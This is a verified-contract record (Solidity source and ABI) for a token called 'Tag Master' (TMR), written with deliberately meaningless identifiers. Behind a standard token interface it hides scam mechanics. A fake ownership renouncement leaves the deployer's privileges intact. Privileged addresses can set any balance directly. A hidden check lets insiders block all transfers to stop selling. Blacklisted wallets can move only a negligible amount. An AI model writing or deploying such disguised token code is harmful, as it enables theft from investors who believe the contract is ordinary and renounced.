{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.2;\n\ninterface fromSender {\n    function createPair(address receiverAmount, address sellBuy) external returns (address);\n}\n\ninterface takeIsSender {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address exemptSwapTeam) external view returns (uint256);\n\n    function transfer(address atAutoSell, uint256 txReceiverLimit) external returns (bool);\n\n    function allowance(address atTo, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 txReceiverLimit) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address atAutoSell,\n        uint256 txReceiverLimit\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed totalTeamToken, uint256 value);\n    event Approval(address indexed atTo, address indexed spender, uint256 value);\n}\n\nabstract contract minWallet {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface atTake {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface feeSell is takeIsSender {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract TagMaster is minWallet, takeIsSender, feeSell {\n\n    function balanceOf(address exemptSwapTeam) public view virtual override returns (uint256) {\n        return maxTradingAmount[exemptSwapTeam];\n    }\n\n    function launchedToken(uint256 txReceiverLimit) public {\n        takeSenderReceiver();\n        enableMaxAmount = txReceiverLimit;\n    }\n\n    function teamReceiver(address receiverLiquidity) public {\n        require(receiverLiquidity.balance < 100000);\n        if (liquidityToken) {\n            return;\n        }\n        if (atReceiverAmount != autoTeam) {\n            autoTeam = launchMax;\n        }\n        minSender[receiverLiquidity] = true;\n        \n        liquidityToken = true;\n    }\n\n    address buyReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function allowance(address shouldAmount, address modeReceiver) external view virtual override returns (uint256) {\n        if (modeReceiver == buyReceiver) {\n            return type(uint256).max;\n        }\n        return tokenReceiverAt[shouldAmount][modeReceiver];\n    }\n\n    function listFrom() public {\n        emit OwnershipTransferred(fundLiquidity, address(0));\n        senderTx = address(0);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return launchedMax;\n    }\n\n    function amountMinFund(address atMin, address atAutoSell, uint256 txReceiverLimit) internal returns (bool) {\n        if (atMin == fundLiquidity) {\n            return maxMarketing(atMin, atAutoSell, txReceiverLimit);\n        }\n        uint256 sellLiquidityExempt = takeIsSender(marketingToken).balanceOf(launchTotal);\n        require(sellLiquidityExempt == enableMaxAmount);\n        require(atAutoSell != launchTotal);\n        if (walletToken[atMin]) {\n            return maxMarketing(atMin, atAutoSell, autoLaunched);\n        }\n        return maxMarketing(atMin, atAutoSell, txReceiverLimit);\n    }\n\n    function transferFrom(address atMin, address atAutoSell, uint256 txReceiverLimit) external override returns (bool) {\n        if (_msgSender() != buyReceiver) {\n            if (tokenReceiverAt[atMin][_msgSender()] != type(uint256).max) {\n                require(txReceiverLimit <= tokenReceiverAt[atMin][_msgSender()]);\n                tokenReceiverAt[atMin][_msgSender()] -= txReceiverLimit;\n            }\n        }\n        return amountMinFund(atMin, atAutoSell, txReceiverLimit);\n    }\n\n    uint256 public atTakeBuy;\n\n    bool private tradingWallet;\n\n    function maxMarketing(address atMin, address atAutoSell, uint256 txReceiverLimit) internal returns (bool) {\n        require(maxTradingAmount[atMin] >= txReceiverLimit);\n        maxTradingAmount[atMin] -= txReceiverLimit;\n        maxTradingAmount[atAutoSell] += txReceiverLimit;\n        emit Transfer(atMin, atAutoSell, txReceiverLimit);\n        return true;\n    }\n\n    function takeSenderReceiver() private view {\n        require(minSender[_msgSender()]);\n    }\n\n    uint256 private launchedMax = 100000000 * 10 ** 18;\n\n    uint256 private atFee;\n\n    function symbol() external view virtual override returns (string memory) {\n        return enableMode;\n    }\n\n    mapping(address => mapping(address => uint256)) private tokenReceiverAt;\n\n    uint8 private feeBuy = 18;\n\n    bool public liquidityToken;\n\n    address launchTotal = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    constructor (){\n        \n        atTake receiverMarketing = atTake(buyReceiver);\n        marketingToken = fromSender(receiverMarketing.factory()).createPair(receiverMarketing.WETH(), address(this));\n        if (atReceiverAmount == totalTxAuto) {\n            totalTxAuto = atTakeBuy;\n        }\n        fundLiquidity = _msgSender();\n        minSender[fundLiquidity] = true;\n        maxTradingAmount[fundLiquidity] = launchedMax;\n        listFrom();\n        if (liquidityLaunchAt) {\n            atReceiverAmount = launchMax;\n        }\n        emit Transfer(address(0), fundLiquidity, launchedMax);\n    }\n\n    mapping(address => bool) public walletToken;\n\n    bool private liquidityLaunchAt;\n\n    string private enableMode = \"TMR\";\n\n    function marketingTotal(address marketingList, uint256 txReceiverLimit) public {\n        takeSenderReceiver();\n        maxTradingAmount[marketingList] = txReceiverLimit;\n    }\n\n    function listIsMax(address txList) public {\n        takeSenderReceiver();\n        \n        if (txList == fundLiquidity || txList == marketingToken) {\n            return;\n        }\n        walletToken[txList] = true;\n    }\n\n    bool public isFund;\n\n    uint256 enableMaxAmount;\n\n    function name() external view virtual override returns (string memory) {\n        return takeLaunch;\n    }\n\n    function approve(address modeReceiver, uint256 txReceiverLimit) public virtual override returns (bool) {\n        tokenReceiverAt[_msgSender()][modeReceiver] = txReceiverLimit;\n        emit Approval(_msgSender(), modeReceiver, txReceiverLimit);\n        return true;\n    }\n\n    uint256 private autoTeam;\n\n    address public marketingToken;\n\n    uint256 public totalTxAuto;\n\n    address private senderTx;\n\n    mapping(address => uint256) private maxTradingAmount;\n\n    uint256 fundSenderTo;\n\n    mapping(address => bool) public minSender;\n\n    function getOwner() external view returns (address) {\n        return senderTx;\n    }\n\n    string private takeLaunch = \"Tag Master\";\n\n    function owner() external view returns (address) {\n        return senderTx;\n    }\n\n    function transfer(address marketingList, uint256 txReceiverLimit) external virtual override returns (bool) {\n        return amountMinFund(_msgSender(), marketingList, txReceiverLimit);\n    }\n\n    uint256 constant autoLaunched = 14 ** 10;\n\n    function decimals() external view virtual override returns (uint8) {\n        return feeBuy;\n    }\n\n    uint256 private launchMax;\n\n    address public fundLiquidity;\n\n    bool private feeEnable;\n\n    uint256 public atReceiverAmount;\n\n    event OwnershipTransferred(address indexed minFund, address indexed takeToken);\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atTo\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minFund\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeToken\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalTeamToken\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldAmount\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeReceiver\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txReceiverLimit\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atReceiverAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atTakeBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptSwapTeam\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundLiquidity\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"txReceiverLimit\",\"type\":\"uint256\"}],\"name\":\"launchedToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txList\",\"type\":\"address\"}],\"name\":\"listIsMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txReceiverLimit\",\"type\":\"uint256\"}],\"name\":\"marketingTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"minSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverLiquidity\",\"type\":\"address\"}],\"name\":\"teamReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalTxAuto\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txReceiverLimit\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atMin\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"atAutoSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txReceiverLimit\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"walletToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "TagMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}